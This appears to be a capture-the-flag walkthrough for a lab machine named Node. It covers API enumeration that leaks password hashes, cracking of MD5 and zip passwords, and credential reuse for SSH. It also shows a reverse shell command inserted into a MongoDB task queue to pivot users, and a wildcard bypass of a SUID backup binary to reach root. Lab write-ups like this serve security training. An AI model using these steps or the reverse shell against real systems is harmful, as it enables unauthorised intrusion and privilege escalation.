node
---

## Steps

1. nmap to discover ports

22, 3000 was open

2. discovering APIs

Going to the site on the browser, and looking at `Debugger`, we can see the source files.

Looking at `app.js`, we see the call to `/profile/:username`

On going to the url, we see a get request to `/api/users/username`

3. Admin login

When we visit `/api/users`, we see the admin and the hash of the password

MD5 cracker gives us the password, and we can login to the interface

4. Downloading the source and SSH to Mark

After we download the backup, we change the extension to `.zip` and see that it is password protected

using `john`, we can crack the password and unzip the file

we look at `app.js` and see the credentials used to login to MongoDB

mark:<password>@localhost...

Using those credentials, we can SSH as mark to the server

5. Getting to Tom through DB insertion

Mark doesn't have any sudo rights, so we try to get Tom

Running `ps aux | grep tom`, we see that its running some processes

One of the processes checks the database for commands and executes it

We insert our command in the database

`db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"})`

Setup a nc listener and wait for the connection

Once we login as Tom, we get the user.txt flag

## Root flag

1. Running `backup` with SUID

run `id` on tom, and we see that we are in the group `admin`

We find all binaries that we can run as admin

`find / -group admin 2>/dev/null`

We can run `/usr/local/bin/backup` as admin, and it has a sticky bit set owned by root, so any commands run by this binary is run as root

2. `ltrace` `backup` binary

Running `ltrace` on `backup`, we see that it checks `/etc/myplace/keys` for the a key

By using one of the keys, we can use backup to zip the `/root` folder

`backup -q <key> /root`

3. Troll face

After unziping the file, we get a troll face.

We discover this is because we have used the string `/root` in the backup process

running `ltrace` again on the binary with the correct token, we see that it checks for certain strings which when present, shows the troll face

```
strstr("/root", "..")                            = nil
strstr("/root", "/root")                         = "/root"
```

4. Not getting the troll face

instead of putting `/root`, we can use a wildcard `/roo*/` which will give us the same effect of zipping the whole folder.

Now when you unzip the file, it gives you the entire root folder where you can find `root.txt`
